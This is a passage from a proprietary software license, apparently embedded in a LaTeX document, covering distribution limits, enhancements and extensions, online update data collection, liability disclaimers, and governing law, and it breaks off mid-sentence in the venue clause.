a. You may only distribute, publicly display, and publicly perform 
unmodified Software. Without limiting the foregoing, You agree to 
maintain (and not supplement, remove, or modify) the same copyright, 
trademark notices and disclaimers in the exact wording as released by 
Developer. 

b. You may only distribute the Software free from any charge beyond the 
reasonable costs of data transfer or storage media. You may -not- (i) 
sell, lease, rent, or otherwise charge for the Software, (ii) include any 
component or subset of the Software in any commercial application or 
product, or (iii) sell, lease, rent, or otherwise charge for any 
appliance (i.e., hardware, peripheral, personal digital device, or other 
electronic product) that includes any component or subset of the 
Software. 


4. You may develop Enhancements to the Software and distribute Your 
Enhancements, provided that You agree to each of the following 
restrictions on this distribution:

a. Enhancements may not modify, supplement, or obscure the user interface 
or output of the Software such that the title of the Software, the 
copyrights and trademark notices in the Software, or the licensing terms 
of the Software are removed, hidden, or made less likely to be discovered 
or read. 

b. If you release any Enhancement to the Software, You agree to 
distribute the Enhancement under the terms of this License (or any other 
later-issued license(s) of Developer for the Software). Upon such 
release, You hereby grant and agree to grant a non-exclusive royalty-free 
right, to both (i) Developer and (ii) any of Developer's later licensees, 
owners, contributors, agents or business partners, to distribute Your 
Enhancement(s) with future versions of the Software provided that such 
versions remain available under the terms of this License (or any other 
later-adopted license(s) of Developer). 


5. You may develop Extensions to the Software and distribute these 
Extensions under any license You see fit, for commercial sale or license 
or for non-commercial use, so long as -each- of the following conditions 
are met: 

a. The Extension, when installed with the Software, must -not- modify any 
of the behavior (e.g., change the display, modify the available commands, 
etc.) of the Software until the user explicitly requests (e.g., by 
invoking or exercising a command or feature are a screen display or other 
express notification of the new code's existence and function) that the 
Extension should be activated. 

b. The Extension may programmatically execute (e.g., call a method) code 
provided by this Software, but may not include or create copies of the 
Software (modified or otherwise) in the Extension itself. 

c. The Extension may not modify, supplement, or obscure the user interface 
or output of the Software such that the title of the Software, the 
copyrights and trademark notices in the Software, or the licensing terms 
of the Software are removed, hidden, or made less likely to be discovered 
or read.


6. If you develop external software components that interface with the 
Software, you may only distribute these components if (a) the external 
software component clearly indicates to the user, via the user interface 
and/or program output, both (i) the role of the Software in the component 
and (ii) where the user may obtain a copy of the Software and (b) the 
external software components do not modify, supplement, or obscure the 
user interface or output of the Software such that the title of the 
Software, the copyrights and trademark notices in the Software, or the 
licensing terms of the Software are removed, hidden, or made less likely 
to be discovered or read.


Online Updates

The Software includes the ability to download updates (i.e., additional 
code) from Developer's server(s). These updates may contain bug fixes, 
new functionality, updated Documentation, and/or Extensions. When 
retrieving these updates, the Software may transmit the Software version 
and operating system information from Your computer to the update server. 
The server may record (store) this information, in conjunction with the 
IP (global Internet Protocol) address of the user, in order to attempt to 
maintain accurate end user and version statistics. By using the online 
update feature, You hereby agree to allow this information to be 
transmitted, recorded, and stored in any nation by or for Developer. 


Proper Use

As an express condition of this License, You agree that You will use the 
Software -solely- in compliance with all then-applicable local, state, 
national, and international laws, rules and regulations as may be amended 
or supplemented from time to time, including any then-current laws and/or 
regulations regarding the transmission and/or encryption of technical 
data exported from or imported into Your country of residence. Violation 
of any of the foregoing will result in immediate, automatic termination 
of this License without notice, and may subject You to state, national 
and/or international penalties and other legal consequences. 


Intellectual Property Ownership

The Software is licensed, not sold. Developer retains exclusive ownership 
of all worldwide copyrights, trade secrets, patents, and all other 
intellectual property rights throughout the world and all applications 
and registrations therefor, in and to the Software and any full or 
partial copies thereof, including any additions thereto. You acknowledge 
that, except for the limited license rights expressly provided in this 
Agreement, no right, title, or interest to the intellectual property in 
the Software or Documentation is provided to You, and that You do not 
obtain any rights, express or implied, in the Software. All rights in and 
to the Software not expressly granted to You in this Agreement are 
expressly reserved by Developer. Product names, words or phrases 
mentioned in this License or the Software may be trademark(s) or 
servicemark(s) of Developer registered in certain nations and/or of third 
parties. You may not alter or supplement the copyright or trademark 
notices as contained in the Software. 


License Termination

This License is effective until terminated. This License will terminate 
immediately without notice from Developer if You breach or fail to comply 
with any provision of this License. Upon such termination You must 
destroy the Software, all accompanying written materials, and all copies 
thereof. 


Limitations of Liability

In no event will Developer, any owner, contributor, agent, business party, 
or other third party affiliated with Developer, be liable to You or any 
third party under any legal theory (including contract, tort, or 
otherwise) for any consequential, incidental, indirect or special damages 
whatsoever (including, without limitation, loss of expected savings, loss 
of confidential information, presence of viruses, damages for loss of 
profits, business interruption, loss of business information and the like 
or otherwise) or any related expense whether foreseeable or not, arising 
out of the use of or inability to use or any failure of the Software or 
accompanying materials, regardless of the basis of the claim and even if 
Developer or Developer's owner, contributor, agent, or business partner 
has been advised of the possibility of such damage. By using the 
Software, You hereby acknowledge that Developer would not offer the 
Software without the inclusion and enforceability of this provision, and 
that You (and not the Developer) are solely responsible for Your network, 
data, and application security testing, planning, audits, updates, and 
training, which require regular analysis, supplementing, and expertise. 


No Warranty

The Software and this License document are provided AS IS with NO WARRANTY 
OF ANY KIND, WHETHER EXPRESS, IMPLIED, STATUTORY OR OTHERWISE, INCLUDING, 
WITHOUT LIMITATION, THE WARRANTY OF DESIGN, MERCHANTABILITY, TITLE, 
NON-INFRINGEMENT, OR FITNESS FOR A PARTICULAR PURPOSE. 


Indemnification

You agree to indemnify, hold harmless, and defend Developer and 
Developer's owners, contributors, agents, and business partners from and 
against any and all claims or actions including reasonable legal expenses 
that arise or result from Your use of or inability to use the Software. 
Developer agrees to notify You and reasonably cooperate with Your defense 
of any third party claim triggering such indemnification. 


Miscellaneous

If any part of this License is found void and unenforceable, it will not 
affect the validity of the balance of this License, which shall remain 
valid and enforceable to the maximum extent according to its terms. 


Choice of Law; Venue

This License will be construed, interpreted and governed by the laws of 
Texas, USA, without regard to its conflict of law rules. Any litigation 
related to this
\end{verbatim}}

\end{document}
